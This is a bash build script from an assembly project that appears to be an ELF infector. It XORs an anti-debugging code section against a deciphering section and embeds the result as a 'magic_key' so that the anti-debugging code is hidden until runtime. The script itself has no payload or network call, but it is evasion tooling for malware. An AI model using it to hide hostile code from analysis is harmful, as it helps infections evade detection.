#!/bin/bash
set -euo pipefail
PROJECT_FOLDER="$(realpath -- $(dirname -- "${BASH_SOURCE:-$0}")/..)"
WORK_FOLDER="$PROJECT_FOLDER"/build/
mkdir -p "$WORK_FOLDER"

NASM_CMD="nasm"
if [ $# -ne 1 ]; then
	echo "Usage: $0 <nasm args>"
	exit 1
fi
NASM_CMD="$NASM_CMD $1"

main()
{
	cd "$PROJECT_FOLDER"
	create_mains_to_merge
	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_uncipher_balanced.o "$WORK_FOLDER"/main_with_only_uncipher.s && ld -o "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf "$WORK_FOLDER"/main_with_only_uncipher_balanced.o
	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.o "$WORK_FOLDER"/main_with_only_anti_debugging.s && ld -o "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.elf "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.o

	# Start and stop addresses are same for both executables because of balancing
	start_address=$(nm "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep "can_run_infection.begin_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/0x\1/')
	stop_address=$(nm "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep "can_run_infection.end_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/obase=16;ibase=16;\U\1+1/' | bc | sed 's/^/0x/')

	start_offset=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | head -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1+1/' | bc)
	end_offset=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | tail -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)

	# Xor between two code parts
	cat "$WORK_FOLDER"/main_with_only_anti_debugging_balanced.elf | head -c+$end_offset | tail -c+$start_offset > "$WORK_FOLDER"/only_anti_debugging.bin
	cat "$WORK_FOLDER"/main_with_only_uncipher_balanced.elf | head -c+$end_offset | tail -c+$start_offset > "$WORK_FOLDER"/only_uncipher.bin
	python3 tools/xor.py "$WORK_FOLDER"/only_anti_debugging.bin "$WORK_FOLDER"/only_uncipher.bin "$WORK_FOLDER"/magic_key.bin

	# Format magic_key and put it inside final source file
	xxd -g1 "$WORK_FOLDER"/magic_key.bin | perl -pe 's/^[0-9a-z]*: ((?:[0-9a-z]{2} )*) .*$/\1/' > "$WORK_FOLDER"/magic_key.s
	perl -i -pe 's/([0-9a-z]{2})/0x\1,/g;s/, $//' "$WORK_FOLDER"/magic_key.s
	sed -i 's/^/db /' "$WORK_FOLDER"/magic_key.s
	cp "$WORK_FOLDER"/main_with_only_anti_debugging.s srcs/final_main.s
	perl -i -pe "s/^magic_key: db 0x00.*$/magic_key: $(cat "$WORK_FOLDER"/magic_key.s)/" srcs/final_main.s
}

create_mains_to_merge()
{
	# Create main with one part each
	perl -0777 -pe 's/\.begin_anti_debugging:.*\.end_anti_debugging://s' srcs/main.s > "$WORK_FOLDER"/main_with_only_uncipher.s
	perl -0777 -pe 's/\.begin_uncipher.*\.end_uncipher://s' srcs/main.s > "$WORK_FOLDER"/main_with_only_anti_debugging.s

	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_uncipher.o "$WORK_FOLDER"/main_with_only_uncipher.s
	$NASM_CMD -I ./includes/ -felf64 -o "$WORK_FOLDER"/main_with_only_anti_debugging.o "$WORK_FOLDER"/main_with_only_anti_debugging.s

	start_offset=$(nm "$WORK_FOLDER"/main_with_only_anti_debugging.o | grep "can_run_infection.begin_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	end_offset=$(nm "$WORK_FOLDER"/main_with_only_anti_debugging.o | grep "can_run_infection.end_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	anti_debugging_size=$((end_offset-start_offset))

	start_offset=$(nm "$WORK_FOLDER"/main_with_only_uncipher.o | grep "can_run_infection.begin_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	end_offset=$(nm "$WORK_FOLDER"/main_with_only_uncipher.o | grep "can_run_infection.end_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	cipher_size=$((end_offset-start_offset))

	# Balance payload sizes and reserve space for magic_key in sources
	if [[ $cipher_size -lt $anti_debugging_size ]]; then
		diff_size=$((anti_debugging_size-cipher_size))
		sed -i -E "s/(\.end_uncipher:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/main_with_only_uncipher.s"

		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $anti_debugging_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_uncipher.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $anti_debugging_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_anti_debugging.s"
	elif [[ $cipher_size -gt $anti_debugging_size ]]; then
		diff_size=$((cipher_size-anti_debugging_size))
		sed -i -E "s/(\.end_anti_debugging:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/main_with_only_anti_debugging.s"

		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_anti_debugging.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_uncipher.s"
	else
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_anti_debugging.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/main_with_only_uncipher.s"
	fi
}

main "$@"
